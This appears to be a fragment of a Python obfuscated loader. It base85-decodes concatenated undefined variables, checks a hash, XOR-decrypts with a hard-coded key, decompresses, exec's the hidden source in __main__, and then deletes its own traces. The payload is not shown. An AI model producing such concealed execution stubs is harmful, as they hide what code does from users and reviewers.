_pxgGGSsAak5c6z = __import__('base64').b85decode(_ckZ9vobrAUtkuT + _cbFavAi53VBFtB + _ceo1udgSJ7KFzt + _cjxf4pJn73ehhs + _cdaq459XqsNpG3 + _cawVeO0_i5hDZ8 + _cf0hVTgp_cmq8q + _cgkPCfQVtyFeIh + _creF4aMkaTw8kb + _cg3MSvedhAgaql + _cixmXupqH9ggDk + _ciB3MJEZ2fOVMA + _co9gcYuobQBQJF + _cgbeutWSDnO_9w + _ctzQ_1f3he0H0U + _ckiy8LdwaMuQQX + _cc9SaH9KDC7wbl + _cyrP522hn7w_0W + _cbDa0FXqXhcjQH + _cs1y_gJJDoMG3C + _ckLReQGvSezDZU + _cfikOrhXr9mjut + _ciZEbl6yaUl_H4 + _chyG7xdJJIACJP + _ce_wmxrQ554aN8 + _cbzIUTWkrNEijd + _crQjAUa3ElVcPW + _csk3wP8ZbmTa8z + _cyQE53IVpRhy1p + _ci3zkdwdmIgKvl + _ciUyIUkC93Wnsq + _chKIzq61cjZOTG + _cprbnum5xd4KBT + _c_lJrsCL5wBerZ + _cbSlPsnkkAtYCD + _ceqcTUOFraZvF7 + _ci7Eess6ePY5DR + _chGjgx9twVZz_b + _cveP5O20cVYuoz + _ci3YRhN53LCRvy + _cg7kUySV1otNkG + _cb6VfSfxol7IVg + _cwCfZOQGhdWIwt + _cnPAFgXRobQjG1 + _ceyugXQqQ_2gzY + _crATG4CNvoa_yu + _clXcbZR1asB3tj + _cydnfezy21MlPu + _cuZauRNqVFVj8B + _cgnIAtzU3qB3ns + _ccgh1LwasZ4A0_ + _cpWROLw7tkzxtO + _cumJYqNc8DSrsu + _cqZ9Ns7vHD6a77 + _ca2rL5Hn2M9Un8 + _clUlLbV0FRWL7v + _chNh0IVxHMQGZi + _czA1DvfohfVXI1 + _caD67XY1ou5Wro + _ctcKiC5531vjv6 + _caPqtnHa6ZQSkW + _ceu4bOJCyk5mVS + _co6TKJN5npMLTk + _cue_x4fX6pSBHI + _clPiLZtE_Ak8JB + _czZNN3ygfr0u8U + _cvwepishGbnV4P + _cm7_GfN_jWkReX + _cd1vflFlfMLO5A + _cgax0uNsHax__D + _csVmirJxG9DooO + _cbBfMIn9fbKzcL + _cvoaPM__AJb1uO + _coU4M_MpF2OvV5 + _cnplWjXxKTbJm6 + _c_TZIANEu7OOS1 + _cft3Y2dfS_N_oN + _coU0RjzkyE5lOw + _czzkG8tUrku58W + _cbLgr4_3QeSs6L + _coft6_bbSombpo + _ciqDGnSLZtKInW + _cqEGR6ByO3rhiB + _ciZVMaIJ70atrz + _ckFkToB0BpxmR_ + _cclq32k6s38TaB + _cpzuZx82dedmuL + _cdAMbnHtW7u4QB + _cfslqpVfVMROgF + _cnksnepw5G6RfM + _cyAlsuFnVPZdRj + _cdyb7BJc3a26Et + _ceg02TaOT3945t + _ceUWszOg8Vgc_B + _clu0xf8C9gmidU + _ce9xCjIlyaRPPr + _cbXsL2thwH3azh + _cpsJGFNLaxL9D8 + _cwVHcbFwv5RVlI + _cvuINfng8Tir_M + _cpeJvCp88NW4Oi + _coAlRakSLE2WIB + _cocuvjpc0WwQXd + _cqRQsm8zWp62Ze + _cmOIPjDpUeNyZB + _cpTqLi3DjyXZOT + _cf8HgiPIq0Shbg + _cbc5BBz9egCw71 + _cou8mohRoiBnud + _cbC9nTe32GaZMH + _ctrFB0JEKuTly3 + _ck3nPFNi6fU2uz + _csSEQMc1G9e_EY + _clDoMYTFHeqivJ + _cbTFcljMXSvU3q + _cftCNGaUgoMzi6 + _cpcaH0OzaTkPbH + _ceDnIwof7prafV + _cyEk9out6xoil6 + _cwF7XcQbV8FFdq + _cjVHZFRTBYEnep + _ciplBxTNxavidW + _crne6g8A49VLw7 + _cmDEXBqfRor5_I + _cwMFKnTiFuu5he + _czOkEFrDEVRpO6 + _c_LKi18zP3aiFy + _cyAgGVkMPnkx3L + _cef7rtJKLKY4X5 + _cluhznEjqWq_hG + _cnW_lXKgCBOcr9 + _co7woAcK4WjZHh + _c_eVN5A2GHr1ah + _cyenfGLa2asUqJ + _cdNbmhG2iETbtW + _cykvnl4wJGRPrT + _cnkb8EWVB5bMf1 + _c_KxpLV4nhdwGs + _cerWVKLjzFO3Gm + _cr6P17TqZvlhGo + _cirYmOZj3OLZAs + _cyMTrR794c0cDy + _cnfPkhKUgOLcjb + _cifdZW3nvzmVL2 + _caNDzskd1OzyUt + _czugz5EXPF0JDW + _cbnUWSejbkTXee + _ciWc89Ok3HqZEW + _cg15phuu7CrkOb + _caXIQCyIIKJb8y + _cuQEZpVCvKXpyK + _cr1_2FXgAKwheE + _ceWFK1xhP5Z_x4 + _cfkfxEQyce6GBJ + _cfWW8hVmPs9e4u + _croop1CQdQ2O27 + _ceo9q22gH7VUFZ + _cvxcL2IrV39HEA + _cugYwQsy0iSQGz + _cbTxIw7EjCEB4w + _ca38LnwxeYdsai + _ct_F5NWDYrbXbs + _cfX4zaviCLd2kc + _cyLMmi0bpAkKHG + _c_Hgy2qQhdSp5H)
if __import__('hashlib').sha256(_pxgGGSsAak5c6z).hexdigest() != '1ae642801824a66fb8bacebb0003a0271ac78486ac801be377c81b25b1f4244e':
    __import__('sys').exit(1)
_xq8XMHSrI7tuyH = bytes([4, 67, 185, 74, 244, 43, 53, 114, 245, 243, 204, 32, 239, 31, 34, 224, 22, 226, 236, 186, 45, 160, 194, 172, 184, 75, 43, 241, 190, 203])
_fkeM4E4Mcn4R14A = bytes([89, 192, 59, 64, 142, 132, 194, 148, 178, 116, 129, 105, 232, 163, 196, 35, 187, 8, 97, 220, 50, 170, 141, 244, 218, 44, 236, 122, 149, 118])

def _fxdPdDkc20s7Agw(_bukjsRu6nK76JU, _kirIIfyCpi8KuK):
    return bytes(_bukjsRu6nK76JU[_ijcVhpS3uYib2r] ^ _kirIIfyCpi8KuK[_ijcVhpS3uYib2r % len(_kirIIfyCpi8KuK)] for _ijcVhpS3uYib2r in range(len(_bukjsRu6nK76JU)))

def _fdy2_LHO9DuSqYv(_tcKwsRajcTtWDN):
    import zlib
    return zlib.decompress(_tcKwsRajcTtWDN) # Un seul niveau de zlib ici pour simplifier

def _feolOntpWVN3r0v():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xrFMHjB_i0Z9vu = _fxdPdDkc20s7Agw(_pxgGGSsAak5c6z, _xq8XMHSrI7tuyH)
    # 2. Décompression Zlib
    _drPlmUw4ZwKJmt = _fdy2_LHO9DuSqYv(_xrFMHjB_i0Z9vu)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _drPlmUw4ZwKJmt.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _n_rVw5Dr54gnRf = _main.__dict__
    _n_rVw5Dr54gnRf.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _n_rVw5Dr54gnRf)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feolOntpWVN3r0v()
try:
    del _fxdPdDkc20s7Agw, _fdy2_LHO9DuSqYv, _feolOntpWVN3r0v
    del _pxgGGSsAak5c6z, _xq8XMHSrI7tuyH, _fkeM4E4Mcn4R14A
except:
    pass
